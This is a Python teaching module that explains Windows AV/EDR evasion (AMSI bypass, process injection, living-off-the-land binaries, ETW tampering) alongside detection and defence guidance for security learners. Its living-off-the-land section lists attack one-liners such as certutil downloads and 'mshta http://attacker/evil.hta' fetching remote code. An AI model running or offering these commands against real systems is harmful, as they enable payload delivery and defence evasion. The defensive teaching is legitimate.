#!/usr/bin/env python3
"""
ERR0RS ULTIMATE — Evasion Lab v1.0
Educational module: How AV/EDR bypass techniques work
and how defenders detect and prevent them.

PURPOSE: This module teaches security professionals HOW
evasion works — from both sides. The same knowledge that
helps a red teamer test defenses helps a blue teamer BUILD
those defenses. You cannot defend against what you don't understand.

This module contains NO actual bypass code — only clear
explanations of techniques, how they work mechanically,
what the attacker achieves, and critically: what the defender
sees and how to detect or prevent each one.

Competes with: Underground forums that sell this knowledge,
               OffSec/SANS courses ($2,000-$6,000),
               Commercial red team training programs

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""


EVASION_KNOWLEDGE = {

    "amsi": {
        "title": "AMSI — Antimalware Scan Interface",
        "tldr":  "Windows component that lets AV/EDR scan scripts before execution. PowerShell, JScript, VBScript all go through it.",
        "what_it_is": (
            "AMSI (Antimalware Scan Interface) is a Windows API introduced in Windows 10. "
            "Every time PowerShell, JScript, VBScript, or WScript executes a script, "
            "it passes the content to AMSI BEFORE running it. Your AV then scans the "
            "content and can block it if it's malicious.\n\n"
            "This is why simply base64-encoding a Mimikatz command used to work "
            "to bypass AV — but doesn't anymore. AMSI decodes and scans the "
            "content after deobfuscation."
        ),
        "how_bypass_works_conceptually": (
            "AMSI bypass techniques typically work by one of three approaches:\n\n"
            "1. PATCHING: Modify the AMSI DLL in memory so the scan function "
            "   always returns 'clean' (AMSI_RESULT_CLEAN). This works because "
            "   the DLL is loaded into the PowerShell process's memory space "
            "   and can be modified by that process.\n\n"
            "2. FORCING AN ERROR: Cause AMSI initialization to fail. "
            "   If AMSI fails to initialize, Windows falls back to allowing "
            "   execution (fail-open design). Security researchers have found "
            "   ways to force this failure.\n\n"
            "3. CONTEXT ABUSE: Abuse the way AMSI decides WHAT to scan. "
            "   Certain execution contexts or API call patterns may not "
            "   trigger the AMSI scan path."
        ),
        "what_defender_sees": (
            "If an attacker uses AMSI bypass:\n"
            "  - Event 4104 (PowerShell Script Block Logging) may show "
            "    obfuscated or suspicious initialization code BEFORE bypass\n"
            "  - ETW (Event Tracing for Windows) can log the patch attempt\n"
            "  - EDRs with kernel-level hooks can detect the memory modification\n"
            "  - AMSI bypass strings themselves are now signatures in many AVs\n"
            "  - Behavioral: PowerShell suddenly loading Mimikatz without AMSI alert "
            "    is itself an anomaly"
        ),
        "defense": (
            "1. Enable PowerShell Script Block Logging (GPO: Administrative Templates → "
            "   Windows Components → Windows PowerShell → Turn on Script Block Logging)\n"
            "2. Enable PowerShell Transcription Logging\n"
            "3. Deploy an EDR with kernel-level protection (not just AMSI-dependent)\n"
            "4. Constrained Language Mode prevents many bypass techniques\n"
            "5. Application Control (AppLocker/WDAC) blocks unsigned scripts\n"
            "6. Alert on PowerShell processes accessing amsi.dll in unusual ways"
        ),
        "mitre": "T1562.001 — Impair Defenses: Disable or Modify Tools",
        "real_world": "APT29, FIN7, and many ransomware groups use AMSI bypass as a standard step before deploying their tools.",
    },

    "process_injection": {
        "title": "Process Injection — Running Code Inside Other Processes",
        "tldr":  "Writing shellcode into a legitimate process's memory and executing it there. Makes malicious code appear to come from a trusted process.",
        "what_it_is": (
            "Process injection is a technique where an attacker writes executable "
            "code into the memory space of a running legitimate process (like "
            "explorer.exe, svchost.exe, or notepad.exe) and executes it from there.\n\n"
            "Why attackers do this:\n"
            "  - Code runs under the identity of the legitimate process\n"
            "  - Network connections appear to come from explorer.exe, not evil.exe\n"
            "  - AV is less likely to scan memory of trusted system processes\n"
            "  - If the original payload file is deleted, code keeps running\n"
            "  - Security products that log by process name are fooled"
        ),
        "injection_types": {
            "DLL Injection":     "Load a malicious DLL into a target process using LoadLibrary. Classic technique, well-detected.",
            "Process Hollowing": "Create a suspended process, replace its memory with malicious code, resume. Process looks legitimate externally.",
            "Thread Hijacking":  "Suspend a thread in a target process, overwrite its instruction pointer, resume. Code runs in existing thread.",
            "APC Injection":     "Queue an Asynchronous Procedure Call to a thread in target process. Executes when thread enters alertable state.",
            "Reflective DLL":    "DLL loads itself without calling LoadLibrary — leaves no trace in the loaded modules list.",
        },
        "what_defender_sees": (
            "Process injection has detectable signals:\n"
            "  - Sysmon Event 8: CreateRemoteThread — process creating thread in another process\n"
            "  - Sysmon Event 10: ProcessAccess — process opening another with PROCESS_VM_WRITE\n"
            "  - API calls: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread in sequence\n"
            "  - Unusual parent-child relationships (explorer.exe spawning cmd.exe)\n"
            "  - Memory regions marked RWX (read-write-execute) in system processes\n"
            "  - Network connections from processes that shouldn't make them (notepad.exe → internet)"
        ),
        "defense": (
            "1. Deploy EDR with memory protection (CrowdStrike, SentinelOne, Defender ATP)\n"
            "2. Enable Sysmon with rules for Event 8 (CreateRemoteThread) and Event 10 (ProcessAccess)\n"
            "3. Credential Guard prevents injection into LSASS specifically\n"
            "4. Windows Defender Credential Guard / PPL protects system processes\n"
            "5. Attack Surface Reduction (ASR) rules block many injection techniques\n"
            "6. Alert on VirtualAllocEx + WriteProcessMemory API sequences"
        ),
        "mitre": "T1055 — Process Injection",
    },

    "living_off_the_land": {
        "title": "Living Off the Land (LOLBAS / GTFOBins)",
        "tldr":  "Using tools already installed on the system to do malicious things. Blends in because the tools are legitimate.",
        "what_it_is": (
            "Living Off the Land (LotL) means attackers use tools, scripts, and "
            "features that already exist on the target system — signed by Microsoft, "
            "already whitelisted by AV, already trusted.\n\n"
            "On Windows this is called LOLBAS (Living Off the Land Binaries and Scripts).\n"
            "On Linux it's called GTFOBins.\n\n"
            "Why this is so effective:\n"
            "  - certutil.exe can download files from the internet\n"
            "  - mshta.exe can execute remote JScript\n"
            "  - regsvr32.exe can execute COM objects\n"
            "  - wmic.exe can execute code remotely\n"
            "  - These are ALL signed Microsoft binaries. AV trusts them by default."
        ),
        "common_examples": {
            "certutil -urlcache -f URL file.exe":  "Download any file from internet using legitimate Windows cert tool",
            "mshta http://attacker/evil.hta":      "Execute remote HTA application — often whitelisted",
            "regsvr32 /s /n /u /i:URL scrobj.dll": "Squiblydoo — execute remote script via registered COM (often whitelisted)",
            "wmic process call create 'cmd.exe'":  "Create process using WMI — bypasses many process creation monitors",
            "rundll32 javascript:..Run('cmd.exe')":"Execute JavaScript inside rundll32 — bypasses script restrictions",
            "bitsadmin /transfer job /download URL": "Download via Background Intelligent Transfer Service",
        },
        "what_defender_sees": (
            "LotL attacks are detected by behavioral anomaly, not signatures:\n"
            "  - certutil making outbound HTTP connections (Event 5156 network filter)\n"
            "  - mshta.exe spawning cmd.exe or PowerShell\n"
            "  - regsvr32.exe making network connections (it never should)\n"
            "  - wmic.exe with process creation arguments\n"
            "  - rundll32.exe executing JavaScript\n"
            "  - These are all detectable IF you're looking for them"
        ),
        "defense": (
            "1. Attack Surface Reduction (ASR) rules block many LotL techniques\n"
            "   - Block Office apps from creating child processes\n"
            "   - Block credential theft from LSASS\n"
            "   - Block untrusted/unsigned executables from USB\n"
            "2. AppLocker/WDAC to restrict which binaries can execute and how\n"
            "3. Network monitoring: alert on certutil/mshta/bitsadmin making outbound connections\n"
            "4. Process command-line logging (Event 4688 with command line)\n"
            "5. Sysmon for comprehensive process + network + file system logging\n"
            "6. Reference LOLBAS project (lolbas-project.github.io) to know what to monitor"
        ),
        "mitre": "T1218 — System Binary Proxy Execution",
        "resources": ["https://lolbas-project.github.io", "https://gtfobins.github.io"],
    },

    "etw_bypass": {
        "title": "ETW — Event Tracing for Windows",
        "tldr":  "Windows telemetry system that security tools rely on. If an attacker disables ETW, they go partially blind to security tools.",
        "what_it_is": (
            "Event Tracing for Windows (ETW) is Windows' built-in high-performance "
            "logging system. Security tools — including Microsoft Defender, many EDRs, "
            "and security monitoring solutions — rely on ETW to get visibility into "
            "what's happening on the system.\n\n"
            "ETW provides: process creation events, network connections, "
            "PowerShell execution, thread creation, file operations, and more.\n\n"
            "Attackers try to disable or manipulate specific ETW providers to "
            "prevent their tools from being logged by security solutions."
        ),
        "what_defender_sees": (
            "ETW tampering is itself detectable:\n"
            "  - Gaps in expected event streams (suddenly no PowerShell events)\n"
            "  - ETW provider modification events\n"
            "  - Memory writes to ntdll.dll or other ETW-related functions\n"
            "  - EDRs with kernel-level protection are not solely ETW-dependent"
        ),
        "defense": (
            "1. Use EDR with kernel-level driver (not just ETW-dependent)\n"
            "2. Forward logs to SIEM in real-time — ETW bypass affects local logging\n"
            "3. Protected Process Light (PPL) prevents modification of certain providers\n"
            "4. Alert on unexpected gaps in PowerShell/process creation event streams"
        ),
        "mitre": "T1562.006 — Impair Defenses: Indicator Blocking",
    },

    "defense_summary": {
        "title": "Evasion Defense Summary — What Blue Teams Need",
        "tldr":  "The complete defensive picture: if you implement all of these, most evasion techniques lose their effectiveness.",
        "tier1_critical": [
            "Enable PowerShell Script Block Logging (catches most script-based attacks)",
            "Deploy Sysmon with comprehensive ruleset (SwiftOnSecurity or Olaf Hartong)",
            "Enable process creation command-line logging (Event 4688)",
            "Deploy EDR with kernel-level protection — not just AMSI hooks",
            "Forward all logs to SIEM in real-time (ETW bypass doesn't touch SIEM)",
        ],
        "tier2_important": [
            "Application Control (AppLocker/WDAC) — whitelist what can execute",
            "Attack Surface Reduction rules — blocks dozens of LotL techniques",
            "Constrained Language Mode for PowerShell in restricted environments",
            "Credential Guard — protects LSASS from memory access",
            "Network segmentation — limits lateral movement after bypass",
        ],
        "tier3_hardening": [
            "Protected Process Light (PPL) on LSASS",
            "Disable legacy scripting engines (VBScript, WScript) where not needed",
            "Block certutil/mshta/regsvr32 outbound network connections via firewall",
            "Enable UEFI Secure Boot + code signing requirements",
            "Regular purple team exercises to validate detection coverage",
        ],
        "key_truth": (
            "No evasion technique is undetectable. Every bypass leaves SOME trace. "
            "The question is whether you're looking for it. "
            "This is why purple team exercises matter: you find the gaps "
            "before an attacker does."
        ),
    },
}


class EvasionLab:
    """Teaching interface for evasion concepts."""

    def get_lesson(self, topic: str) -> str:
        topic_lower = topic.lower().strip()
        # Match by key or by searching titles
        entry = EVASION_KNOWLEDGE.get(topic_lower)
        if not entry:
            for k, v in EVASION_KNOWLEDGE.items():
                if topic_lower in k or topic_lower in v.get("title","").lower():
                    entry = v
                    break
        if not entry:
            topics = ", ".join(EVASION_KNOWLEDGE.keys())
            return f"[EVASION LAB] Topic not found. Available: {topics}"
        return self._format(entry)

    def _format(self, entry: dict) -> str:
        sep  = "=" * 56
        dash = "-" * 56
        lines = [sep, f"  [ERR0RS EVASION LAB] {entry.get('title','')}", sep, ""]
        if entry.get("tldr"):
            lines += [f"[TL;DR] {entry['tldr']}", ""]
        for key in ["what_it_is", "how_bypass_works_conceptually", "key_truth"]:
            if entry.get(key):
                lines += [dash, entry[key], ""]
        for key in ["injection_types", "common_examples"]:
            val = entry.get(key)
            if isinstance(val, dict):
                lines += [dash]
                for k, v in val.items():
                    lines.append(f"  {k}")
                    lines.append(f"    → {v}")
                lines.append("")
        for key in ["what_defender_sees"]:
            if entry.get(key):
                lines += [dash, "WHAT THE DEFENDER SEES:", entry[key], ""]
        if entry.get("defense"):
            lines += [dash, "DEFENSE / DETECTION:", entry["defense"], ""]
        for tier in ["tier1_critical", "tier2_important", "tier3_hardening"]:
            items = entry.get(tier)
            if items:
                label = tier.replace("_", " ").upper()
                lines += [f"  [{label}]"]
                for item in items:
                    lines.append(f"    ✦ {item}")
                lines.append("")
        if entry.get("mitre"):
            lines += [f"  MITRE: {entry['mitre']}", ""]
        lines.append(sep)
        return "\n".join(lines)

    def list_topics(self) -> str:
        lines = ["\n  [EVASION LAB] Available Topics", "  " + "="*42]
        for k, v in EVASION_KNOWLEDGE.items():
            lines.append(f"    • {k:<25} — {v.get('tldr','')[:50]}")
        lines.append("\n  Command: teach me evasion <topic>")
        return "\n".join(lines)


evasion_lab = EvasionLab()


def handle_evasion(cmd: str, params: dict = None) -> dict:
    cmd_low = cmd.lower().strip()
    for topic in EVASION_KNOWLEDGE:
        if topic in cmd_low:
            return {"status": "success", "stdout": evasion_lab.get_lesson(topic)}
    if "list" in cmd_low or "topics" in cmd_low:
        return {"status": "success", "stdout": evasion_lab.list_topics()}
    return {"status": "success", "stdout": evasion_lab.list_topics()}
